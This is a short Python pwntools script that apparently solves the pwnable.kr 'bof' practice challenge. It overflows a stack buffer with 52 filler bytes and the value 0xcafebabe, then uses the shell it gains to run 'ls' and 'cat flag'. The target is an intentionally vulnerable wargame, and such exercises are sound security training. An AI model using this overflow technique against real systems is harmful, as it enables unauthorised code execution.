# -*- coding: utf-8 -*-

from pwn import *

r = remote("pwnable.kr", 9000)

payload = "A"*52 + "\xbe\xba\xfe\xca"

r.sendline(payload)
r.sendline('ls'.encode())
print(r.recv())
r.sendline('cat flag'.encode())
print(r.recv())
r.close()